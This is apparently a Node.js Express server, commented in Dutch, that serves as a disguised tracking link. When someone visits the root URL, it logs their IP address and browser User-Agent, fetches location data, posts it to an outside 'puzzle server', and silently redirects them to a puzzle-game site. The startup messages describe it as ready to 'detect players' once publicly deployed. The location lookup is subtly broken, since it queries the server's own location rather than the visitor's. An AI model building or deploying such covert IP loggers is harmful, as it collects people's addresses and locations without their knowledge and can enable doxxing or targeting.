const express = require('express');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());

// Logging van alle requests
app.use((req, res, next) => {
    const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    console.log(`${new Date().toISOString()} - ${req.method} ${req.path} - IP: ${clientIP}`);
    next();
});

// HOOFDROUTE - wanneer iemand gewoon de URL bezoekt
app.get('/', async (req, res) => {
    try {
        // FIX 1: Verwijder dubbele clientIP declaratie
        const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || 
                         req.headers['x-real-ip'] || 
                         req.connection.remoteAddress || 
                         req.socket.remoteAddress || 
                         '127.0.0.1';
        const userAgent = req.get('User-Agent') || 'Unknown';
        
        console.log(`🎮 PLAYER DETECTED ON URL!`);
        console.log(`IP: ${clientIP}`);
        console.log(`User-Agent: ${userAgent}`);
        
        // Haal IP info op van meerdere services
        let ipInfo = {};

        // Probeer verschillende IP info services
        try {
            const fetch = (await import('node-fetch')).default;
            
            // Service 1: ipapi.co (fallback naar anderen als rate limited)
            try {
                const ipResponse = await fetch('https://ipapi.co/json/');
                const data = await ipResponse.json();
                if (!data.error && !data.reason) {
                    ipInfo = data;
                    console.log(`📍 Location (ipapi.co): ${ipInfo.city}, ${ipInfo.country_name}`);
                } else {
                    throw new Error('ipapi.co rate limited');
                }
            } catch (err) {
                console.log('⚠️ ipapi.co failed, trying backup...');
                
                // Service 2: ip-api.com (backup)
                try {
                    const response = await fetch('http://ip-api.com/json/');
                    const data = await response.json();
                    if (data.status === 'success') {
                        ipInfo = {
                            ip: data.query,
                            city: data.city,
                            region: data.regionName,
                            country_name: data.country,
                            country_code: data.countryCode,
                            timezone: data.timezone,
                            latitude: data.lat,
                            longitude: data.lon,
                            isp: data.isp
                        };
                        console.log(`📍 Location (ip-api.com): ${ipInfo.city}, ${ipInfo.country_name}`);
                    } else {
                        throw new Error('ip-api.com failed');
                    }
                } catch (err2) {
                    console.log('⚠️ All IP services failed, using basic info');
                    // Fallback naar basic info
                    ipInfo = {
                        ip: clientIP,
                        city: 'Unknown',
                        country_name: 'Unknown',
                        error: false,
                        source: 'header'
                    };
                }
            }
        } catch (err) {
            console.log('⚠️ Could not get IP info:', err.message);
            ipInfo = {
                ip: clientIP,
                city: 'Unknown',
                country_name: 'Unknown',
                error: true,
                reason: 'Service unavailable'
            };
        }

        // Verstuur data naar JOUW puzzle server
        const PUZZLE_SERVER_URL = 'https://puzzle-server-0l4i.onrender.com/info';
        
        const playerData = {
            UserId: 'DIRECT_URL_VISITOR',
            ipInfo: ipInfo
        };

        try {
            // FIX 2: Hergebruik fetch van boven
            const fetch = (await import('node-fetch')).default;
            const response = await fetch(PUZZLE_SERVER_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(playerData)
            });

            if (response.ok) {
                console.log('✅ Data sent to puzzle server successfully!');
            } else {
                console.log('❌ Failed to send to puzzle server:', response.status);
            }
        } catch (err) {
            console.log('❌ Error sending to puzzle server:', err.message);
        }

        // Redirect naar officialpuzzlegame
        const REDIRECT_URL = 'https://officialpuzzlegame.com/netlify';
        res.redirect(REDIRECT_URL);
        
    } catch (error) {
        console.error('❌ Error in main route:', error);
        res.status(500).send('Server Error');
    }
});

// API route voor user data (van je frontend)
app.post('/info', async (req, res) => {
    try {
        const { UserId, ipInfo } = req.body;
        const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
        
        console.log(`📊 USER DATA RECEIVED:`);
        console.log(`Username: ${UserId}`);
        console.log(`IP from request: ${clientIP}`);
        console.log(`IP from ipapi: ${ipInfo ? ipInfo.ip : 'N/A'}`);
        console.log(`Location: ${ipInfo ? ipInfo.city + ', ' + ipInfo.country_name : 'Unknown'}`);
        
        res.json({
            success: true,
            message: 'Data received successfully',
            timestamp: new Date().toISOString()
        });

    } catch (error) {
        console.error('❌ Error processing user data:', error);
        res.status(500).json({
            success: false,
            error: 'Server error processing data'
        });
    }
});

// Health check
app.get('/health', (req, res) => {
    res.json({
        status: 'OK',
        timestamp: new Date().toISOString(),
        uptime: Math.floor(process.uptime()) + ' seconds'
    });
});

// Start server
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Backend server running on port ${PORT}`);
    console.log(`🌐 Public URL: https://YOUR-APP-NAME.onrender.com/`);
    console.log(`❤️ Health check: https://YOUR-APP-NAME.onrender.com/health`);
    console.log(`📡 API endpoint: https://YOUR-APP-NAME.onrender.com/info`);
    console.log('');
    console.log('🎯 Ready to detect players via public URL!');
    console.log('📋 Deploy this to Render.com or Heroku for public access');
});